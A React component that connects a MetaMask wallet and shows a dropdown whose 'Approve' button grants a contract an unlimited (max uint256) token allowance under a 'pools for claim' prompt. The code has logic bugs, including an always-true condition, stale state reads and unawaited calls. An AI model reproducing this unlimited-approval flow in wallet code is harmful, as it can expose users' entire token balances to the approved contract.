import React, {useState} from 'react'
import Web3 from 'web3'
import ContractConnector from "@/contract/contract";

const ConnectWallet = () => {
    const [web3, setWeb3] = useState<Web3>(null)
    const [account, setAccount] = useState<string>(null)

    const [isAllowed, setIsAllowed] = useState(false)

    const [allowance, setAllowance] = useState<any>(0)

    const [showDropMenu, setShowDropMenu] = useState(false)

    const contract = new ContractConnector()


    const connectToMetaMask = async () => {
        try {
            // Проверяем, установлен ли MetaMask в браузере
            if (typeof window.ethereum !== 'undefined' && window.ethereum.request) {
                // Подключаемся к MetaMask
                const ethereum = window.ethereum
                await ethereum.request({method: 'eth_requestAccounts'})
                // Создаем экземпляр объекта Web3 и получаем адрес аккаунта
                const web3 = new Web3(ethereum)
                const accounts = await web3.eth.getAccounts()
                setWeb3(web3)
                if (accounts) {
                    setAccount(accounts[0])
                }
                if (web3) {

                    const accounts = await web3.eth.getAccounts();

                    const userData = contract.userData();

                    for (let i = 0; i < 5; i++) {
                        if (userData[i] != '0' || userData[i] != false) {
                            setIsAllowed(true)
                        }
                    }

                    if (!isAllowed) {
                        const allowanceTemp = contract.allowance(allowance, setAllowance)
                        console.log('AAAAAAA')
                        console.log(allowance)
                    }

                    // console.log(isAllowed)
                } else {
                    console.log('web3 undefined')
                }
            } else {
                // MetaMask не установлен, выводим сообщение
                alert('Please install MetaMask to connect to the blockchain.')
            }
        } catch (err) {
            console.log(err)
        }
    }

    const translateAddress = (address) => {
        let result = '';
        for (let i = 0; i < 10; i++) {
            result += address[i]
        }
        result += '...';
        for (let i = address.length - 1; i > address.length - 3; i--) {
            result += address[i]
        }
        return result
    }


    return (
        <div className={'w-full relative'}>
            {account ? <p className={'text-xs leading-[80%] sm:text-sm'} onClick={() => {
                    setShowDropMenu(!showDropMenu)
                }}>{translateAddress(account)}</p> :
                <button className={'text-xs leading-[80%] sm:text-sm'} onClick={async () => {
                    await connectToMetaMask();
                }}>Connect MetaMask</button>}
            {showDropMenu ?
                <div className={'w-full absolute top-10 bg-white p-4 rounded-xl'}>
                    {allowance == 0 ? <div>
                        <p className={'text-xs text-left'}>You have not any pools for claim yet, needing approve</p>
                        <div
                            className={'bg-orange text-white text-xs uppercase rounded-md mt-2 p-1 flex items-center justify-center'}
                            onClick={() => {
                                const approved=contract.approve('115792089237316195423570985008687907853269984665640564039457584007913129639935')
                                console.log(approved)
                            }}>
                            Approve
                        </div>
                    </div> : null}
                    <div
                        className={'bg-orange text-white text-xs uppercase rounded-md mt-2 p-1 flex items-center justify-center'}
                        onClick={() => {
                            setAccount(null)
                            setShowDropMenu(false)
                        }}>
                        Disconnect
                    </div>
                </div> : null}
        </div>
    )
}

export default ConnectWallet